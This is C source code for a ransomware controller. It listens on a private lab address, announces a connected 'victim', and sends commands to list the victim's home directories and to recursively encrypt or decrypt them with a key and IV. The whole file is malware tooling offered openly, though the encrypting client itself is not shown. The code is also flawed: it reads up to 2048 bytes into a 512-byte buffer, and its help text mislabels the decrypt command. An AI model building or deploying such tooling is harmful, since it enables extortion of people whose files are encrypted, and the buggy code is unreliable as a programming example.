#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void usage();
int command_handler(char * command, int sockid, int client_socket);


int main()
{
    int sockid;
    int server_port = 8888;
    char *server_ip = "10.0.0.2";

    sockid = socket(AF_INET, SOCK_STREAM,0);

    struct sockaddr_in server_addr, client_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    int n, len, client_socket;
    char buffer[2048];

    bind(sockid, (const struct sockaddr *)&server_addr, sizeof(server_addr));
    printf("Waiting for connection...\n");
    n = listen(sockid,1);
    len = sizeof(client_addr);
    client_socket = accept(sockid, (struct sockaddr *)&client_addr, &len);
    printf("Connected to a victim\n");

    

    //n = recv(client_socket, (char *)buffer, 2048, MSG_WAITALL );
    while (1) 
    {
        char command[512];
        printf("h for help\n");
        printf("$ ");
        fgets(command,512,stdin);
        command_handler(command, sockid, client_socket);

    }   
}


void usage() 
{
    printf("h : prints help\n");
    printf("ls : list every directories of the victim's home directory\n");
    printf("enc : recursively encrypt a directory that you are in\n");
    printf("dec <directory> <key> <iv> : recursively encrypt a directory\n");

}

int command_handler(char * command,int sockid, int client_socket)
{
    char buffer[512];
    if (strncmp(command,"h",1) == 0)
    {
        usage();
    }
    else if(strncmp(command,"ls",2) == 0)
    {   
        
        send(client_socket, (const char *)command, strlen(command),0);
        recv(client_socket, (char *)buffer, 2048, 0 );
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"enc",3) == 0)
    {
        send(client_socket, (const char *)command, strlen(command),0);
        recv(client_socket, (char *)buffer, 2048, 0);
        printf("%s\n", buffer);
    }
    else if (strncmp(command,"dec",3) == 0)
    {
        send(client_socket, (const char *)command, strlen(command),0);
        recv(client_socket, (char *)buffer, 2048, 0);
        printf("%s\n", buffer);
    }
    else 
    {
        printf("command not found type h for help\n");
    }

}

